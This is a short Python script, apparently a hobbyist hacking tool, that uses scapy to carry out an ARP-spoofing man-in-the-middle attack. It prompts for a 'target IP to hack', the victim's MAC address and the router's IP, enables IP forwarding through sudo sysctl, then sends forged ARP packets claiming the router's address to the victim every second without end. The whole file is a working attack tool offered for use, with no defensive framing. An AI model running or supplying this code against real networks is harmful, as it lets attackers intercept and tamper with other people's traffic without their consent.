from scapy.all import sniff, ls, ARP, IPv6, DNS, DNSRR, Ether, conf, IP, send
from subprocess import call
import time
import os 

def modify_ip_forwarding(activate=True):
    #Change ip forwarding
    if activate:
        os.system('sudo sysctl -w net.inet.ip.forwarding=1')
        print('Enable IP forwarding')
    else:
        os.system('sudo sysctl -w net.inet.ip.forwarding=0')
        print('Disable IP forwarding')

def hex2bin(d, nb=0):
    # Convert Hexadecimal number to binary
    d=int(d,16)
    if d==0:
        b="0"
    else:
        b=""
        while d!=0:
            b="01"[d&1]+b
            d=d>>1
    return b.zfill(nb)


def arp_mitm_attack():
    op=1 # Op code 1 for ARP requests

    victim_ip=input('Enter the target IP to hack: ') #person IP to attack
    victim_ip=victim_ip.replace(" ","")

    victim_mac=input('Enter the target MAC to hack: ') #mac of the victim
    victim_mac=victim_mac.replace("-",":")
    victim_mac=victim_mac.replace(" ","")

    router_ip=input('Enter the routers IP *SHOULD BE ON SAME ROUTER*: ') #routers IP.. Should be the same one.
    router_ip=router_ip.replace(" ","")

    arp=ARP(op=op,psrc=router_ip,pdst=victim_ip,hwdst=victim_mac)
    #arp=ARP(op=1,psrc='192.168.0.5',pdst='192.168.0.16',hwdst='DC:41:5F:57:3B:F2')

    while 1:
        send(arp)
        time.sleep(1)